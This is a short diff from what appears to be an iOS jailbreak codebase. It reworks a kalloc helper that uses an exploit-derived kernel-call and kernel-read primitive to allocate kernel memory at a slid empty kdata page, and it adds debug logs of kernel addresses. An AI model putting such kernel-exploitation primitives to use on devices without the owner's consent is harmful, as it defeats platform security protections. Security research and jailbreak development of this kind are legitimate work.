@@ -98,10 +98,24 @@ void kread_string(uint64_t addr, char *out) {
 
 uint64_t kalloc(size_t ksize) {
     // kalloc slightly more
-    uint64_t r = kcall(kernel_info.kernel_functions.container_init, kernel_info.fake_userclient + 0x200, ksize / 8 + 8, 0, 0, 0, 0);
+   // uint64_t r = kcall(kernel_info.kernel_functions.container_init, kernel_info.fake_userclient + 0x200, ksize / 8 + 8, 0, 0, 0, 0);
+    JBLogDebug("[+] Attempting KALLOC");
+    JBLogDebug("[+] kernel_info.fake_userclient: 0x%x", kernel_info.fake_userclient);
+    JBLogDebug("[+] off_empty_kdata_page + slide: 0x%llx", off_empty_kdata_page + kernel_info.kslide);
+    JBLogDebug("[+] off_empty_kdata_page - slide: 0x%llx", off_empty_kdata_page - kernel_info.kslide);
+    JBLogDebug("[+] off_empty_kdata_page: 0x%llx", off_empty_kdata_page);
+    JBLogDebug("[+] kernel_info.kernel_functions.container_init: 0x%llx", kernel_info.kernel_functions.container_init);
+
+    uint64_t r = kcall(kernel_info.kernel_functions.container_init, off_empty_kdata_page + kernel_info.kslide + 0x200, ksize / 8, 0, 0, 0, 0);
+
     if (r == 0) return 0;
-    uint32_t low32 = kread32(kernel_info.fake_userclient + 0x200 + 0x20);
-    uint32_t high32 = kread32(kernel_info.fake_userclient + 0x200 + 0x20 + 0x4);
+    JBLogDebug("[+] r not 0");
+
+//    uint32_t low32 = kread32(kernel_info.fake_userclient + 0x200 + 0x20);
+//    uint32_t high32 = kread32(kernel_info.fake_userclient + 0x200 + 0x20 + 0x4);
+    uint32_t low32 = kread32(off_empty_kdata_page + kernel_info.kslide + 0x200 + 0x20);
+    uint32_t high32 = kread32(off_empty_kdata_page + kernel_info.kslide + 0x200 + 0x20 + 0x4);
+    JBLogDebug("[+] high32: 0x%x", high32);
 
     return (((uint64_t)high32) << 32) | low32;
 }
